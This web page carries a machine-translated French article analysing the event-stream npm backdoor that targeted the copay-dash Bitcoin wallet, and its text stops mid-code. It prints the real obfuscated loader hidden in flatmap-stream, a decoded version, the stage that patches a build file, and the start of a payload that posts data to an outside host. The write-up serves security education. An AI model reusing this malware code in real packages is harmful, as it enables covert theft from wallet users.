<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🧛🏽 💖 🙎🏻 Expliquez la porte dérobée dans le flux d'événements 🚮 🧛🏻 👎🏿</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Si vous travaillez avec Javascript, alors vous avez probablement remarqué beaucoup de bruit à propos de la vulnérabilité dans le package npm de flux d...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Expliquez la porte dérobée dans le flux d'événements</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/431360/"><p>  Si vous travaillez avec Javascript, alors vous avez probablement remarqué beaucoup de bruit à propos de la vulnérabilité dans le package npm de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">flux d'événements</a> .  ( <em>Un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">article à ce sujet a</a> également <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">été</a> publié sur Habré.</em> ) Malheureusement, une analyse détaillée de la situation est enterrée sous plus de 600 commentaires dans le <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">numéro sur Github</a> , dont la plupart sont une flamme sur l'état du npm, l'open source en général, etc.  Je pensais que c'était mauvais, car la porte dérobée est vraiment exceptionnellement intelligente et intéressante d'un point de vue technique, et elle nous enseigne également une leçon importante sur la façon de maintenir la sécurité dans les applications Javascript.  J'ai donc décidé d'écrire un article avec une explication détaillée du fonctionnement de cette attaque et de ce que la communauté Javascript peut faire pour mieux se défendre contre de telles attaques à l'avenir. </p><a name="habracut"></a><br><p>  Avant de commencer, je tiens à remercier <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">FallingSnow</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">maths22</a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">joepie91</a> pour leur excellente enquête.  Ils ont fait tout le travail difficile d'analyser la vulnérabilité et de comprendre ce qu'elle fait.  Plus loin dans le texte, je citerai leurs résultats indiquant la paternité, mais je pense qu'il vaut la peine d'indiquer explicitement que je n'ai pas fait tout ce travail moi-même.  Je résume simplement ce que d'autres ont découvert. </p><br><h2 id="predystoriya">  Contexte </h2><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">event-stream</a> est un module npm populaire qui contient des utilitaires pour travailler avec des flux de données dans une application node.js.  Maintenant, il est téléchargé plus de 1,9 million de fois par jour.  Cependant, il n'a pas été en développement actif depuis plusieurs années.  Son auteur, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Dominic Tarr</a> , soutient un grand nombre d'autres projets et n'utilise plus ce module dans des projets personnels, il a donc été ignoré. </p><br><p>  Vers la mi-septembre, un utilisateur avec le surnom right9ctrl (le compte GitHub a maintenant été supprimé) a suggéré de prendre en charge le support du module.  Dominic a accepté et a donné à right9ctrl les droits d'accès à Github et à npm.  L'histoire des commits semble inoffensive à première vue: </p><br><p><img src="https://habrastorage.org/webt/fs/l7/l_/fsl7l_tjlxllksbmjvoishfzsl8.png"></p><br><p>  <em>Capture d'écran de l'historique des validations dans le flux d'événements sur Github</em> </p><br><p> Le 9 septembre, right9ctrl a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ajouté un nouveau module</a> <code>flatmap-stream</code> fonction de celui-ci, pour implémenter la fonctionnalité <code>flatmap</code> pour <code>event-stream</code> (une solution tout à fait appropriée, car event-stream avait déjà des utilitaires similaires, par exemple, une <code>map</code> régulière).  Le 16 septembre, right9ctrl a ensuite <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">supprimé la dépendance</a> <code>flatmap-stream</code> et implémenté directement la méthode <code>flatmap</code> .  Et encore une fois, rien ne dérange, il n'est pas rare d'ajouter une nouvelle dépendance, puis de décider dans quelques jours qu'il vaudra mieux mettre en œuvre la même chose soi-même. </p><br><h2 id="ataka">  Attaque </h2><br><p>  La bibliothèque <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">flatmap-stream</a> semble également inoffensive - en fait, elle contient une implémentation d'une carte plate pour les flux de données (bien que quelque chose devrait faire attention - la bibliothèque n'a qu'un contributeur et aucun téléchargement de npm jusqu'à ce point). </p><br><p><img src="https://habrastorage.org/webt/_b/bl/bv/_bblbvu7cyu_56yrkrsycs9mgkk.png"></p><br><p>  <em>Capture d'écran de la page flatmap-stream sur GitHub</em> </p><br><p>  Cependant, la version de ce module publiée dans npm contenait du code supplémentaire dans un fichier minifié, que vous ne remarquerez peut-être même pas, même en sachant qu'il est là: </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Stream=<span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"stream"</span></span>).Stream;<span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.exports=<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e,n</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i=<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Stream,a=<span class="hljs-number"><span class="hljs-number">0</span></span>,o=<span class="hljs-number"><span class="hljs-number">0</span></span>,u=!<span class="hljs-number"><span class="hljs-number">1</span></span>,f=!<span class="hljs-number"><span class="hljs-number">1</span></span>,l=!<span class="hljs-number"><span class="hljs-number">1</span></span>,c=<span class="hljs-number"><span class="hljs-number">0</span></span>,s=!<span class="hljs-number"><span class="hljs-number">1</span></span>,d=(n=n||{}).failures?<span class="hljs-string"><span class="hljs-string">"failure"</span></span>:<span class="hljs-string"><span class="hljs-string">"error"</span></span>,m={};<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">w</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r,e</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t=c+<span class="hljs-number"><span class="hljs-number">1</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(e===t?(<span class="hljs-keyword"><span class="hljs-keyword">void</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>!==r&amp;&amp;i.emit.apply(i,[<span class="hljs-string"><span class="hljs-string">"data"</span></span>,r]),c++,t++):m[e]=r,m.hasOwnProperty(t)){<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n=m[t];<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">delete</span></span> m[t],w(n,t)}a===++o&amp;&amp;(f&amp;&amp;(f=!<span class="hljs-number"><span class="hljs-number">1</span></span>,i.emit(<span class="hljs-string"><span class="hljs-string">"drain"</span></span>)),u&amp;&amp;v())}<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">p</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r,e,t</span></span></span><span class="hljs-function">)</span></span>{l||(s=!<span class="hljs-number"><span class="hljs-number">0</span></span>,r&amp;&amp;!n.failures||w(e,t),r&amp;&amp;i.emit.apply(i,[d,r]),s=!<span class="hljs-number"><span class="hljs-number">1</span></span>)}<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">b</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r,t,n</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> e.call(<span class="hljs-literal"><span class="hljs-literal">null</span></span>,r,<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r,e</span></span></span><span class="hljs-function">)</span></span>{n(r,e,t)})}<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">v</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(u=!<span class="hljs-number"><span class="hljs-number">0</span></span>,i.writable=!<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-keyword"><span class="hljs-keyword">void</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>!==r)<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> w(r,a);a==o&amp;&amp;(i.readable=!<span class="hljs-number"><span class="hljs-number">1</span></span>,i.emit(<span class="hljs-string"><span class="hljs-string">"end"</span></span>),i.destroy())}<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> i.writable=!<span class="hljs-number"><span class="hljs-number">0</span></span>,i.readable=!<span class="hljs-number"><span class="hljs-number">0</span></span>,i.write=<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(u)<span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Error</span></span>(<span class="hljs-string"><span class="hljs-string">"flatmap stream is not writable"</span></span>);s=!<span class="hljs-number"><span class="hljs-number">1</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">try</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> r){a++;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t=b(r[e],a,p);<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(f=!<span class="hljs-number"><span class="hljs-number">1</span></span>===t)<span class="hljs-keyword"><span class="hljs-keyword">break</span></span>}<span class="hljs-keyword"><span class="hljs-keyword">return</span></span>!f}<span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(r){<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(s)<span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> r;<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> p(r),!f}},i.end=<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r</span></span></span><span class="hljs-function">)</span></span>{u||v(r)},i.destroy=<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{u=l=!<span class="hljs-number"><span class="hljs-number">0</span></span>,i.writable=i.readable=f=!<span class="hljs-number"><span class="hljs-number">1</span></span>,process.nextTick(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{i.emit(<span class="hljs-string"><span class="hljs-string">"close"</span></span>)})},i.pause=<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{f=!<span class="hljs-number"><span class="hljs-number">0</span></span>},i.resume=<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{f=!<span class="hljs-number"><span class="hljs-number">1</span></span>},i};!<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">try</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r=<span class="hljs-built_in"><span class="hljs-built_in">require</span></span>,t=process;<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> Buffer.from(r,<span class="hljs-string"><span class="hljs-string">"hex"</span></span>).toString()}<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n=r(e(<span class="hljs-string"><span class="hljs-string">"2e2f746573742f64617461"</span></span>)),o=t[e(n[<span class="hljs-number"><span class="hljs-number">3</span></span>])][e(n[<span class="hljs-number"><span class="hljs-number">4</span></span>])];<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!o)<span class="hljs-keyword"><span class="hljs-keyword">return</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> u=r(e(n[<span class="hljs-number"><span class="hljs-number">2</span></span>]))[e(n[<span class="hljs-number"><span class="hljs-number">6</span></span>])](e(n[<span class="hljs-number"><span class="hljs-number">5</span></span>]),o),a=u.update(n[<span class="hljs-number"><span class="hljs-number">0</span></span>],e(n[<span class="hljs-number"><span class="hljs-number">8</span></span>]),e(n[<span class="hljs-number"><span class="hljs-number">9</span></span>]));a+=u.final(e(n[<span class="hljs-number"><span class="hljs-number">9</span></span>]));<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> f=<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.constructor;f.paths=<span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.paths,f[e(n[<span class="hljs-number"><span class="hljs-number">7</span></span>])](a,<span class="hljs-string"><span class="hljs-string">""</span></span>),f.exports(n[<span class="hljs-number"><span class="hljs-number">1</span></span>])}<span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(r){}}();</code> </pre> <br><p>  La partie nuisible ici est à la fin, et elle a été spécialement masquée pour éviter la détection: </p><br><pre> <code class="javascript hljs">!<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">try</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r=<span class="hljs-built_in"><span class="hljs-built_in">require</span></span>,t=process;<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r</span></span></span><span class="hljs-function">)</span></span>{<span class="hljs-keyword"><span class="hljs-keyword">return</span></span> Buffer.from(r,<span class="hljs-string"><span class="hljs-string">"hex"</span></span>).toString()}<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n=r(e(<span class="hljs-string"><span class="hljs-string">"2e2f746573742f64617461"</span></span>)),o=t[e(n[<span class="hljs-number"><span class="hljs-number">3</span></span>])][e(n[<span class="hljs-number"><span class="hljs-number">4</span></span>])];<span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!o)<span class="hljs-keyword"><span class="hljs-keyword">return</span></span>;<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> u=r(e(n[<span class="hljs-number"><span class="hljs-number">2</span></span>]))[e(n[<span class="hljs-number"><span class="hljs-number">6</span></span>])](e(n[<span class="hljs-number"><span class="hljs-number">5</span></span>]),o),a=u.update(n[<span class="hljs-number"><span class="hljs-number">0</span></span>],e(n[<span class="hljs-number"><span class="hljs-number">8</span></span>]),e(n[<span class="hljs-number"><span class="hljs-number">9</span></span>]));a+=u.final(e(n[<span class="hljs-number"><span class="hljs-number">9</span></span>]));<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> f=<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.constructor;f.paths=<span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.paths,f[e(n[<span class="hljs-number"><span class="hljs-number">7</span></span>])](a,<span class="hljs-string"><span class="hljs-string">""</span></span>),f.exports(n[<span class="hljs-number"><span class="hljs-number">1</span></span>])}<span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(r){}}();</code> </pre> <br><p>  Dans un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">problème sur Github,</a> FallingSnow a restauré le code source du signet et a montré ce qui se passait là-bas: </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// var r = require, t = process; // function e(r) { // return Buffer.from(r, "hex").toString() // } function decode(data) { return Buffer.from(data, "hex").toString() } // var n = r(e("2e2f746573742f64617461")), // var n = require(decode("2e2f746573742f64617461")) // var n = require('./test/data') var n = ["","","63727970746f","656e76","6e706d5f7061636b6167655f6465736372697074696f6e","616573323536","6372656174654465636970686572","5f636f6d70696c65","686578","75746638"] // o = t[e(n[3])][e(n[4])]; // npm_package_description = process[decode(n[3])][decode(n[4])]; npm_package_description = process['env']['npm_package_description']; // if (!o) return; if (!npm_package_description) return; // var u = r(e(n[2]))[e(n[6])](e(n[5]), o), // var decipher = require(decode(n[2]))[decode(n[6])](decode(n[5]), npm_package_description), var decipher = require('crypto')['createDecipher']('aes256', npm_package_description), // a = u.update(n[0], e(n[8]), e(n[9])); // decoded = decipher.update(n[0], e(n[8]), e(n[9])); decoded = decipher.update(n[0], 'hex', 'utf8'); console.log(n); // IDK why this is here... // a += u.final(e(n[9])); decoded += decipher.final('utf8'); // var f = new module.constructor; var newModule = new module.constructor; /**************** DO NOT UNCOMMENT [THIS RUNS THE CODE] **************/ // f.paths = module.paths, f[e(n[7])](a, ""), f.exports(n[1]) // newModule.paths = module.paths, newModule['_compile'](decoded, ""), newModule.exports(n[1]) // newModule.paths = module.paths // newModule['_compile'](decoded, "") // Module.prototype._compile = function(content, filename) // newModule.exports(n[1])</span></span></code> </pre> <br><p>  Ainsi, le code télécharge le fichier <code>./test/data.js</code> , qui était également <a href="">intégré dans la version publiée dans npm</a> malgré le manque de code source sur GitHub.  Ce fichier contient un tableau de chaînes chiffrées via AES256.  La <code>npm_package_description</code> environnement <code>npm_package_description</code> est définie par la commande npm lorsque le code est exécuté dans le contexte d'un package, c'est-à-dire que le package racine, y compris le flux d'événements -&gt; la chaîne de dépendances de flux plat, sera utilisé pour définir <code>npm_package_description</code> (et d'autres variables similaires).  ( <em>Remarque: en d'autres termes, la description du fichier package.json de votre projet dans lequel vous avez exécuté cette commande sera utilisée</em> ).  Ainsi, le code déchiffre le contenu de <code>test/data.js</code> utilisant <code>npm_package_description</code> comme clé, puis essaie d'exécuter le résultat. </p><br><p>  Pour la grande majorité des paquets, cela entraînera une erreur (que le code malveillant détectera et ignorera discrètement), car leur description n'est pas la bonne clé pour le chiffrement AES256 et le résultat du déchiffrement sera un non-sens.  Il s'agit d'une attaque très ciblée sur un package spécifique.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">maths22</a> et d'autres utilisateurs ont téléchargé une liste de modules npm qui dépendent du flux d'événements, et en triant les descriptions de ces modules, nous avons sélectionné la bonne clé et trouvé le package cible: c'était <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">copay-dash</a> , une plate-forme pour les portefeuilles bitcoin.  Sa description, "A Secure Bitcoin Wallet", décrypte avec succès le contenu de <code>test/data.js</code> , montrant le code suivant (aimablement fourni par <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">joepie91</a> ): </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/*@@*/</span></span> <span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.exports = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-regexp"><span class="hljs-regexp">/build\:.*\-release/</span></span>.test(process.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>])) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = process.env.npm_package_description, r = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"fs"</span></span>), i = <span class="hljs-string"><span class="hljs-string">"./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js"</span></span>, n = r.statSync(i), c = r.readFileSync(i, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>), o = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"crypto"</span></span>).createDecipher(<span class="hljs-string"><span class="hljs-string">"aes256"</span></span>, t), s = o.update(e, <span class="hljs-string"><span class="hljs-string">"hex"</span></span>, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>); s = <span class="hljs-string"><span class="hljs-string">"\n"</span></span> + (s += o.final(<span class="hljs-string"><span class="hljs-string">"utf8"</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> a = c.indexOf(<span class="hljs-string"><span class="hljs-string">"\n/*@@*/"</span></span>); <span class="hljs-number"><span class="hljs-number">0</span></span> &lt;= a &amp;&amp; (c = c.substr(<span class="hljs-number"><span class="hljs-number">0</span></span>, a)), r.writeFileSync(i, c + s, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>), r.utimesSync(i, n.atime, n.mtime), process.on(<span class="hljs-string"><span class="hljs-string">"exit"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { r.writeFileSync(i, c, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>), r.utimesSync(i, n.atime, n.mtime) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} }) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} };</code> </pre> <br><p>  Ce code lance un autre niveau de déchiffrement, auquel le dernier script malveillant s'ouvre: </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/*@@*/</span></span> ! <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"http"</span></span>), a = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"crypto"</span></span>), c = <span class="hljs-string"><span class="hljs-string">"-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\\n2wIDAQAB\\n-----END PUBLIC KEY-----"</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">i</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t, n</span></span></span><span class="hljs-function">) </span></span>{ e = Buffer.from(e, <span class="hljs-string"><span class="hljs-string">"hex"</span></span>).toString(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = o.request({ <span class="hljs-attr"><span class="hljs-attr">hostname</span></span>: e, <span class="hljs-attr"><span class="hljs-attr">port</span></span>: <span class="hljs-number"><span class="hljs-number">8080</span></span>, <span class="hljs-attr"><span class="hljs-attr">method</span></span>: <span class="hljs-string"><span class="hljs-string">"POST"</span></span>, <span class="hljs-attr"><span class="hljs-attr">path</span></span>: <span class="hljs-string"><span class="hljs-string">"/"</span></span> + t, <span class="hljs-attr"><span class="hljs-attr">headers</span></span>: { <span class="hljs-string"><span class="hljs-string">"Content-Length"</span></span>: n.length, <span class="hljs-string"><span class="hljs-string">"Content-Type"</span></span>: <span class="hljs-string"><span class="hljs-string">"text/html"</span></span> } }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{}); r.on(<span class="hljs-string"><span class="hljs-string">"error"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span 